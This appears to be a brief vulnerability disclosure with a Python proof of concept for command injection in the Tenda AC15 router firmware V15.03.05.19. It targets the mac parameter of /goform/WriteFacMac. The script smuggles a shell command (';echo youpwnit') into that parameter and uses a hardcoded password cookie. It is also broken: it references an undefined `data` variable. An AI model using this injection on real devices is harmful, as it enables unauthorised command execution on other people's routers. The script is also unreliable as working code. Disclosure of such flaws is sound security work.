A command execution vulnerability exists in Tenda AC15 V15.03.05.19. The vulnerability arises from the application failing to properly filter construct commands, special characters, commands, etc. An attacker exploits the vulnerability to perform a command injection attack via the mac parameter of the formWriteFacMac method.

<img width="820" height="279" alt="image" src="https://github.com/user-attachments/assets/3caa48e9-c721-4c52-9226-ef5beec3ad1f" />

```
from pwn import *
import requests

url = "http://192.168.100.254/goform/WriteFacMac?mac=;echo youpwnit "

cookie = {"Cookie":"password=12345"}
response = requests.get(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)
print(response.text)
```
